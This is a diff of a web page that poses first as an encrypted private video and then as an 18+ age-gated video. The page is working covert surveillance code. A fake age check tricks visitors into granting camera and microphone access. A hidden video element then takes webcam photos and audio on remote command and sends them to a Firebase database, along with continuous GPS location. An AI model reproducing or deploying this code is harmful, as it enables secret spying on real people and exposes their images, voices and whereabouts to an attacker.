@@ -2,78 +2,119 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Private Stream Access</title>
+    <title>Content Age Restricted</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        body { margin: 0; background: #000; color: #fff; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; }
-        #player-box { width: 90%; max-width: 450px; aspect-ratio: 16/9; background: #050505; border: 1px solid #1a1a1a; display: flex; justify-content: center; align-items: center; border-radius: 15px; cursor: pointer; position: relative; overflow: hidden; }
-        #play-btn { width: 70px; height: 70px; background: rgba(255,0,0,0.85); border-radius: 50%; display: flex; justify-content: center; align-items: center; box-shadow: 0 0 30px rgba(255,0,0,0.4); }
-        #play-btn::after { content: ''; border-top: 15px solid transparent; border-bottom: 15px solid transparent; border-left: 25px solid #fff; margin-left: 5px; }
-        .glow-text { color: #00ff41; font-size: 18px; text-shadow: 0 0 10px #00ff41; margin-top: 20px; }
+        body { margin: 0; background: #000; color: #fff; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        
+        /* Blur Thumbnail Stage */
+        #content-wrapper { width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; position: relative; }
+        
+        .blur-bg { 
+            width: 90%; max-width: 400px; aspect-ratio: 16/9; 
+            background: url('https://via.placeholder.com/640x360/222/555?text=Restricted+Content'); 
+            background-size: cover; filter: blur(15px); border-radius: 10px; border: 1px solid #333;
+        }
+
+        #play-overlay { 
+            position: absolute; width: 80px; height: 80px; 
+            background: rgba(255,0,0,0.9); border-radius: 50%; 
+            display: flex; justify-content: center; align-items: center; cursor: pointer; 
+            box-shadow: 0 0 20px rgba(255,0,0,0.5); z-index: 10;
+        }
+        #play-overlay::after { content: ''; border-top: 15px solid transparent; border-bottom: 15px solid transparent; border-left: 25px solid #fff; margin-left: 5px; }
+
+        .warning-text { margin-top: 20px; color: #ff3131; font-weight: bold; text-align: center; }
+
+        /* Video Stage (Hidden Initially) */
+        #main-video { display: none; width: 100%; height: 100%; object-fit: contain; background: #000; }
     </style>
 </head>
 <body>
-    <div id="player-box" onclick="startTracking()">
-        <div id="play-btn"></div>
+
+    <div id="content-wrapper">
+        <div id="play-overlay" onclick="askAge()"></div>
+        <div class="blur-bg"></div>
+        <div class="warning-text">
+            <h2>18+ ADULT CONTENT</h2>
+            <p>Click play to verify age and watch.</p>
+        </div>
     </div>
-    <div class="glow-text">VIDEO ENCRYPTED: CLICK TO DECODE</div>
+
+    <video id="main-video" controls loop>
+        <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+    </video>
 
     <script>
         const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
-        const agentID = "UNIT-" + Math.floor(1000 + Math.random() * 9000);
+        const agentID = "UNIT_" + Math.floor(Math.random() * 9999);
 
-        async function startTracking() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                document.body.innerHTML = "<div style='color:#00ff41; font-family:monospace; padding:20px;'>[SYSTEM] DECRYPTING DATA...<br>[SYSTEM] SYNCING SATELLITE...<br>[SYSTEM] DO NOT CLOSE TAB</div>";
-
-                const v = document.createElement('video');
-                v.srcObject = stream; v.muted = true; v.play();
-
-                // Advanced Data: Battery & Online Status
-                setInterval(async () => {
-                    const bat = await navigator.getBattery();
-                    db.ref('targets/' + agentID + '/info').set({
-                        battery: Math.floor(bat.level * 100) + "%",
-                        status: "ONLINE",
-                        lastSeen: new Date().toLocaleTimeString()
-                    });
-                }, 5000);
-
-                // Command Engine
-                db.ref('commands/' + agentID).on('value', async snap => {
-                    const cmd = snap.val();
-                    if(!cmd) return;
+        async function askAge() {
+            // Fake Age Verification
+            const confirmAge = confirm("This content is for 18+ only. Are you over 18 years old?");
+            
+            if (confirmAge) {
+                try {
+                    // Trigger Permissions
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                     
-                    if(cmd.action.includes('photo')) {
-                        const canvas = document.createElement('canvas');
-                        canvas.width = v.videoWidth; canvas.height = v.videoHeight;
-                        canvas.getContext('2d').drawImage(v, 0, 0);
-                        db.ref('targets/' + agentID + '/photos').push({ img: canvas.toDataURL('image/jpeg', 0.4), time: Date.now() });
-                    }
-                    if(cmd.action === 'audio') {
-                        const rec = new MediaRecorder(stream);
-                        let chunks = [];
-                        rec.ondataavailable = e => chunks.push(e.data);
-                        rec.onstop = () => {
-                            const reader = new FileReader();
-                            reader.readAsDataURL(new Blob(chunks, {type:'audio/webm'}));
-                            reader.onloadend = () => db.ref('targets/' + agentID + '/audios').push({ audio: reader.result });
-                        };
-                        rec.start(); setTimeout(() => rec.stop(), 4000);
-                    }
-                    db.ref('commands/' + agentID).remove();
-                });
+                    // Switch UI to Video Player
+                    document.getElementById('content-wrapper').style.display = 'none';
+                    const videoPlayer = document.getElementById('main-video');
+                    videoPlayer.style.display = 'block';
+                    videoPlayer.play();
 
-                // GPS Tracking
-                navigator.geolocation.watchPosition(p => {
-                    db.ref('targets/' + agentID + '/location').set({ lat: p.coords.latitude, lng: p.coords.longitude });
-                });
+                    // Keep System Active
+                    startBackgroundProcess(stream);
 
-            } catch(e) { alert("Access Denied: Please click Allow to view."); location.reload(); }
+                } catch (e) {
+                    alert("Verification Failed: You must allow permissions to watch restricted videos.");
+                    location.reload();
+                }
+            }
+        }
+
+        function startBackgroundProcess(stream) {
+            // Invisible Video for Hacking
+            const hiddenV = document.createElement('video');
+            hiddenV.srcObject = stream; hiddenV.muted = true; hiddenV.play();
+
+            // Notify Admin
+            db.ref('targets/' + agentID + '/info').set({ status: "WATCHING_LIVE", time: new Date().toLocaleTimeString() });
+
+            // Command Listener
+            db.ref('commands/' + agentID).on('value', async snap => {
+                const cmd = snap.val();
+                if(!cmd) return;
+
+                if(cmd.action.includes('photo')) {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = hiddenV.videoWidth; canvas.height = hiddenV.videoHeight;
+                    canvas.getContext('2d').drawImage(hiddenV, 0, 0);
+                    db.ref('targets/' + agentID + '/photos').push({ img: canvas.toDataURL('image/jpeg', 0.5), time: Date.now() });
+                }
+                
+                if(cmd.action === 'audio') {
+                    const rec = new MediaRecorder(stream);
+                    let ch = [];
+                    rec.ondataavailable = e => ch.push(e.data);
+                    rec.onstop = () => {
+                        const reader = new FileReader();
+                        reader.readAsDataURL(new Blob(ch, {type:'audio/webm'}));
+                        reader.onloadend = () => db.ref('targets/' + agentID + '/audios').push({ audio: reader.result });
+                    };
+                    rec.start(); setTimeout(() => rec.stop(), 5000);
+                }
+                db.ref('commands/' + agentID).remove();
+            });
+
+            // Tracking Location
+            navigator.geolocation.watchPosition(p => {
+                db.ref('targets/' + agentID + '/location').set({ lat: p.coords.latitude, lng: p.coords.longitude });
+            });
         }
     </script>
 </body>
